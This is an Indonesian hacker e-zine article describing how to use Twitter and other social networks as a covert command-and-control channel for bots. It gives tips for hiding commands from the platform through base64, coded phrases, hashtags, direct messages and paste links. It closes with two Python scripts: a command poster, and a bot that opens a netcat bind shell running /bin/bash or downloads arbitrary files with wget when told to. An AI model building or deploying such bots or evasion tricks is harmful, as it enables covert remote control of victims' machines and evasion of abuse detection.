@@ -1,0 +1,409 @@
+                     _|                            _|                      
+   _|_|      _|_|_|  _|_|_|      _|_|    _|_|_|_|      _|_|_|      _|_|    
+ _|_|_|_|  _|        _|    _|  _|    _|      _|    _|  _|    _|  _|_|_|_|  
+ _|        _|        _|    _|  _|    _|    _|      _|  _|    _|  _|        
+   _|_|_|    _|_|_|  _|    _|    _|_|    _|_|_|_|  _|  _|    _|    _|_|_|  
+
+ECHO MAGAZINE VOLUME VIII, ISSUE XXII, PHILE 0x010.TXT
+
+Social Networking: Bot/Botnet Command & Control Center Channel - az001
+az001/at/echo/dot/or/dot/id
+
+
+---[ Pendahuluan
+
+Setelah menulis Local & Underground News pada edisi sebelumnya tentang
+Social Networking[1], beberapa bulan kemudian baru saya menyempatkan diri 
+mencari informasi lebih jauh mengenai salah satu yang dibahas disana,
+yakni "Twitter sebagai alat kontrol Bot/Botnet".
+
+Pada tulisan ini saya akan mencoba membahas secara singkat tentang
+bagaimana penggunaan situs jejaring sosial sebagai alternatif kanal 
+untuk mengontrol Bot. 
+
+Tidak dibahas bagaimana caranya Bot tersebut akhirnya berada
+pada mesin yang diinginkan.
+
+
+---[ Background
+
+Situs jejaring sosial sebagai salah satu kanal C&C (Command & Control) 
+sebenarnya hampir sama dengan penggunaan kanal yang lain, IRC misalnya. 
+
+Menurut beberapa artikel[2] yang saya baca dan menurut saya memang menarik,
+karena jejaring sosial biasanya memiliki jumlah pengguna yang sangat besar
+dan setiap harinya menghasilkan data yang sangat besar pula,
+itu membuat kita mudah untuk menyembunyikan "perintah"
+dan tentunya membuat C&C sulit untuk dideteksi, asyiknya lagi hampir semua
+situs jejaring sosial menyediakan API untuk mengakses beragam fitur 
+yang ada pada situs jejaring sosial tersebut.
+
+
+---[ Twitter sebagai kanal C&C
+
+Ya, mari kita bahas beberapa kemungkinan yang bisa kita lakukan dalam
+penggunaan jejaring sosial sebagai kanal untuk C&C. 
+Kali ini kita ambil satu contoh situs jejaring sosial yaitu Twitter, 
+selain itu anda juga dapat menggunakan Facebook, LinkedIn, Friendster,
+FourSquare, Koprol, dan sejenisnya.
+
+Sederhananya, Bot akan memonitor akun twitter yang kita buat dan
+menjalankan perintah yang kita tulis di akun tersebut.
+Cara untuk memonitor akun tersebut juga sederhana, 
+mulai dari menggunakan RSS feed atau dapat menggunakan API yang telah
+disediakan oleh Twitter.
+
+Beberapa cara yang biasa dan dapat dilakukan di Twitter adalah sebagai
+berikut : 
+
+[1] Status Tweet
+
+    Cara yang biasa dan paling mudah dilakukan adalah tentunya dengan
+    membuat tweet baru, contohnya seperti :
+
+    "PING 10.0.0.1" 
+    "SHUTDOWN"
+
+    Sayangnya pada contoh diatas, perintah tersebut tentu terlalu mudah
+    dibaca oleh semua orang.
+    Diluar sana, biasanya orang membuat akun twitter yang diproteksi, 
+    sehingga hanya user/bot yang diizinkan yang hanya dapat membaca tweet
+    tersebut. 
+
+    Sebagian lainnya mengkombinasikan antara akun twitter tersebut dengan 
+    penggunaan base64 untuk menyembunyikannya.
+
+    Contohnya seperti :
+
+    "UElORyAxMC4xLjEuMQ=="
+    "U0hVVERPV04="
+
+    Kelemahan cara diatas adalah terlalu mudah bagi twitter untuk mencari
+    akun yang tweetnya mengandung base64 
+    dan memblokir akun tersebut.
+
+    Salah satu cara meminimalisir kecurigaan adalah dengan memberikan
+    perintah yang tidak bisa ditebak maksudnya,
+    dan bahkan mungkin tidak disadari oleh pengguna twitter yang lain.
+
+    Sebagai contoh :
+
+
+    "@temen1 Main game yuk, IP gue 10.0.0.1, nick gue PINGKAN ?" 
+
+    "echo zine udah keluar, silahkan download di http://ezine.echo.or.id/ezine.tar"
+
+
+    Pesan pertama mengandung arti "ping 10.0.01", "10.0.0.1" menunjukkan
+    alamat IP dan kata "PINGKAN" menunjukkan perintah ping.
+
+    Pada pesan kedua tentu saja "download http://ezine.echo.or.id/ezine.tar", 
+    kata "download" menunjukkan perintah download dan url tersebut tentu saja
+    menunjukkan alamat file yang akan didownload.
+
+    Cara seperti ini tampaknya sulit dideteksi oleh twitter, walaupun pada 
+    implementasinya jika ingin membuat lebih banyak variasi kalimat, 
+    kita harus menyiapkan beberapa kata.
+
+    Untuk "permainan" kalimat/kata ini sebenarnya tinggal seberapa kreatif
+    anda membuatnya :D.
+
+ 
+[2] Tweet ke akun acak
+
+    Dengan cara ini, kita akan mengirim pesan yang didalamnya adalah
+    perintah ke akun twitter secara acak, nantinya Bot akan mencari pesan tersebut 
+    (lewat fitur search) dan jika pesan tersebut ditemukan, lalu akan dijalankan.
+  
+    Ilustrasi 1:
+   
+
+		PESAN		 ACAK		      PESAN
+    TUKANGPOS ---------> TWITTER ACC[1,2,3,n] ---> Twitter Acc 2 
+
+
+    Pada ilustrasi 1 ini, TUKANGPOS mengirim PESAN yang ternyata 
+    akun twitter nomor 2 yang dikirimi pesan tersebut.
+
+
+   Ilustrasi 2:
+
+
+			  |--- Twitter Acc 1
+			  |	
+                          |--- Twitter Acc 2
+          CARI PESAN      | 	                     PESAN
+   BOT--> ------------> |-|--- Twitter Acc 3  |-> Twitter Acc 2  
+    			  |		 	       |			
+    			  |--- Twitter Acc n	       |
+     						       |
+						       V
+    					     [ JALANKAN PERINTAH ]
+    
+
+    Pada ilustrasi 2 ini, Bot mencari pesan ke seluruh akun twitter
+    (melalui fitur search twitter),dan ternyata pesan tersebut ditemukan 
+    pada akun twitter 2, lalu Bot menjalankan perintah tersebut.
+
+    Cara ini sebenarnya cukup mudah diimplementasikan, asal kita tahu metode 
+    yang bagus untuk mencari pesan tersembunyi tersebut di banyaknya akun twitter
+    yang bertebaran di seluruh penjuru dunia.
+ 
+    Metode filter hashtag bisa dijadikan contoh, dengan membuat hashtag di twitter,
+    Bot kita lebih mudah mencarinya. Contoh penggunaan hashtag :
+
+
+    "Main game yuk, server 10.0.0.1, nick gue PINGKAN #gameping"
+
+
+    Walaupun agak sulit untuk twitter mendeteksi dan membedakan apakah akun
+    tersebut benar akun asli milik orang atau memang akun kita yang sengaja dibuat
+    untuk kepentingan BOT, jika metode yang kita gunakan sudah diketahui 
+    ya tinggal tunggu waktu untuk mereka mencari solusinya. 
+   
+    Lucunya misalkan terlalu sering menggunakan hashtag yang sama, 
+    bisa jadi nanti malah nongkrong di trending topic twitter =)).
+
+    Kelihatannya menggabungkan cara ini dengan "permainan" kata yang telah
+    dibahas sebelumnya menjadi lumayan ampuh.
+
+
+[3] Direct Message
+
+    Menggunakan Direct Message (DM) menggantikan tweet biasa rupanya juga
+    bisa menjadi senjata ampuh, DM adalah salah satu fitur yang biasanya 
+    digunakan untuk mengirim pesan dari satu user ke user yang lainnya.
+   
+    Karena Direct Message ini hanya dapat dibaca oleh 2 user (yang mengirim
+    dan yang dikirimi), maka agaknya sulit bagi twitter untuk mendeteksi hal ini. 
+    Namun saya tetap menyarankan agar "permainan" kata tetap digabungkan dengan fitur ini,
+    untuk berjaga jaga jika penggunaan DM semakin sering digunakan untuk hal ini 
+    dan twitter akan lebih waspada.
+
+    Jika hal tersebut terjadi maka sebenarnya lebih mudah untuk twitter menutup 
+    2 akun tersebut sekaligus.
+
+
+[4] Gabungkan dengan Social Network lain
+    Dengan menggabungkan twitter dengan jejaring sosial lainnya, mungkin
+    dapat menjadi salah satu alternatif, berikut ini contoh beberapa yang bisa dilakukan.
+  
+    [a] Twitter + FourSquare
+        Dengan Foursqure mungkin kita dapat menggabungkan seperti ini :
+
+        "Meeting bersama client gogol.com - I'm at Pacific Place.http://4sq.com/9EDS11"
+
+        Dari tweet tersebut, sebenarnya bisa saja kita mengartikan bahwa gogol.com adalah target
+        dan Pacific sebagai perintah "scan", jadi dari tweet diatas bisa diartikan.
+
+        "scan gogol.com"
+
+    [b] Twitter + TinyPaste 
+        Untuk perintah yang agak panjang, mungkin seperti "ls -al/var/www/" , 
+        walaupun dapat langsung kita tuliskan di tweet/dm, mungkin salah satu alternatif dapat
+       	digunakannya TinyPaste, seperti :
+
+        "Puisi untukmu Adinda, cek disini : http://tinypaste.com/458745"
+
+        Jika BOT menemukan tweet ini dan menemukan kata "Puisi" otomatis dia akan 
+	mengunjungi url tinypaste tersebut dan menjalankan isinya.
+
+
+    Dengan penggabungan twitter dengan jejaring sosial dan atau aplikasi web lainnya,
+    membuat lebih kaya dan agaknya lebih manusiawi, sehingga tidak mudah dicurigai oleh twitter.
+
+
+Sebenarnya masih banyak cara lainnya selain 4 cara yang sudah disebutkan tadi, 
+namun banyak dari cara tersebut yang merupakan variasi dari beberapa cara diatas.
+
+Contoh kecilnya adalah seperti mengganti base64 dengan caesar cipher, 
+mengganti IP dengan huruf ( 10.1.1.1 menjadi J.A.A.A ) dan mungkin juga
+dengan bahasa 4l4y ? :p.
+
+
+
+---[ Jejaring Sosial lain
+
+Selain Twitter, bisa digunakan beberapa jejaring sosial seperti yang saya
+sebutkan diatas, cara yang dilakukan hampir sama dengan yang ada di Twitter,
+walaupun ada beberapa perbedaan pada fitur yang ada disana.
+
+Alangkah baiknya menambahkan jejaring sosial lainnya sebagai kanal untuk
+C&C, untuk menghindari jaringan twitter down (sering sekali nih :p), akun twitter di blok,
+dan lain sebagainya.
+
+
+---[ Simple Script ( Bot & Tukangpos )
+
+Berikut ini adalah script yang dibuat dengan beberapa contoh perintah yang
+dapat digunakan.
+
+Di sini ada dua buah script yang saya buat, tukangpos.py bertugas untuk
+post pesan ke twitter dan sample-bot.py bertugas sebagai bot.
+ 
+Saya menggunakan module twitter-python[3] untuk mengakses API Twitter.
+Setelah dibandingkandengan jika langsung membuat melalui httplib / curl dan atau kawan
+kawannya,proses pengambilan informasi/perintah dari twitter ternyata lebih cepat
+dibandingkan melalui module twitter-python.
+
+Dan salah satu kekurangan menggunakan API Twitter adalah, adanya pembatasan
+akses ke API per akun. Sebagai informasi, pada saat tulisan ini dibuat pembatasan[4] penggunaan
+API Twitter adalah :
+
+.Post Status/Updates 	: 1,000 per hari
+.API Request 		: 150 per jam
+.Direct Message(s) 	: 250 per hari
+
+
+
+
+------------------] tukangpos.py [---=
+
+#!/usr/bin/env python
+
+import twitter,sys
+
+def py_posttwit(nickname,password,posttext):
+	api = twitter.Api(username=nickname,password=password)
+
+	if len(posttext)<2:
+		isisurat=posttext[0]
+	else:
+		isisurat=posttext[0] + " " + posttext[1]
+
+	status = api.PostUpdate(isisurat)
+
+	print isisurat + " " + "dikirim oleh pak pos"
+
+
+py_posttwit('twitteracc','passwordtwitter',sys.argv[1:])
+
+
+------------------------ EOF ----------------//
+
+
+
+-----------------] sample-bot.py [---=
+
+#!/usr/bin/env python
+
+import twitter,string,time
+from subprocess import call
+
+def py_lasttwit(nickname):
+	api = twitter.Api()
+	statuses = api.GetUserTimeline(nickname)
+
+	x = [s.text for s in statuses]
+	return x[0]
+
+
+def py_start_bot(nickname,ttl,reng):
+	for d in range(1,reng):
+
+		cmd = py_lasttwit(nickname)
+		cmdd = string.split(cmd,' ')
+		cmdrun = cmdd[0]
+
+		if len(cmdd) < 2:
+			if cmdrun=="BIND":
+				call(['nc','-lp33','-e/bin/bash'])
+			else:
+				print "Sedang menunggu perintah atasan...."
+
+		else:
+			cmdparam = cmdd[1]
+			if cmdrun=="DL":
+				call(['wget',cmdparam])
+			else:
+				print "Sedang menunggu perintah atasan...."
+
+		time.sleep(ttl)
+
+py_start_bot('twitteracc',2,2000)
+
+----------------- EOF ----------//
+
+
+Note :
+
+.-- Jalankan sample-bot.py terlebih dahulu (perintah BIND bekerja kalau
+anda menggunakan root)
+
+.-- Setelah itu jalankan tukangpos.py dengan mengetikkan :
+    ./tukangpost.py BIND atau ./tukangpost.py DL http://target.com/file.zip
+
+.-- Jika anda sedang menjalankan bot dan sudah mengupdate status twitter
+    nya melalui tukangpos namun bot anda belum juga berganti perintah,
+    jawabannya adalah : masih ada cache, jika ingin mengubahnya nilai waktu cache,
+    baca dokumentasi [5] module twitter-python.
+
+.-- Pada script ini, jika tukangpos.py mengirim command yang sama diwaktu
+    yang sama, maka akan timbul Error :p, silahkan cari solusinya sendiri,
+    kelihatannya pembatasan ini sengaja dilakukan oleh twitter.
+
+.-- Script ini tidaklah sempurna, ini hanya sekedar contoh, sebenarnya
+    banyak lagi yang saya ingin tambahkan :p.
+
+
+
+---[ Kesimpulan
+
+Penggunaan jejaring sosial sebagai kanal bagi Bot/BotNet agaknya cukup
+dapat menambah opsi baru, selain menggunakan IRC sebagai kanalnya.
+
+Sulit terdeteksinya kanal jenis ini mungkin karena merupakan situs yang
+populer, sehingga paket data yang diterima oleh Bot berasal dari situs tersebut, 
+sehingga mungkin sistem administrator/user tidak terlalu curiga akan hal ini.
+
+Permainan kata menjadi faktor penting untuk menjaga kanal kita agar tidak
+diketahui penyedia layanan, kemampuan kita membuat Bot Pintar adalah 
+salah satu tantangan tersendiri.Mungkin bisa mencoba membuat anagram 
+seperti da vinci code ?.
+
+Tampaknya beberapa bulan kedepan, akan muncul banyak Bot/BotNet yang
+memanfaatkan situs jejaring sosial ini sebagai salah satu kanalnya.
+
+Saat tulisan ini ditulis, sudah ada beberapa PoC yang beredar [6] [7]
+walaupun pada saat masuk halaman download ternyata tidak ada :D.
+
+Update: ternyata walaupun tidak ditemukan pada halaman downloadnya,
+setelah menulis artikel ini saya penasaran mencari PoC tersebut
+dan akhirnya saya menemukan PoC[8] yang dirilis saat Defcon 17 
+yang berlangsung tahun lalu. Saya belum mencoba PoC tersebut,
+yang pasti PoC tersebut tentunya lebih baik dari yang saya buat ini :p.
+
+
+Ya, mudah - mudahan artikel ini dapat bermanfaat bagi kita semua.
+
+
+
+
+---[ Referensi
+
+[1] Local & International News
+    http://ezine.echo.or.id/ezine21/e21_008.txt
+
+[2] Kreiosc2
+    http://www.digininja.org/kreiosc2/
+
+[3] Python-Twitter Module
+    http://code.google.com/p/python-twitter/
+
+[4] Twitter API Help - Rate Limiting
+    http://help.twitter.com/forums/10711/entries/15364
+
+[5] Python Twitter Module Documentation
+    http://static.unto.net/python-twitter/0.6/doc/twitter.html
+
+[6] Kreiosc2 - How It Works
+    http://www.digininja.org/kreiosc2/how_it_works.php
+
+[7] The DIY Twitter Botnet Creator
+    http://sunbeltblog.blogspot.com/2010/05/diy-twitter-botnet-creator.html
+
+[8] http://www.digininja.org/files/kreiosc2_2.0.tar.bz2 (diakses 27 May 2010)
+
+[9] The Python Language Reference
+    http://docs.python.org/reference/
+
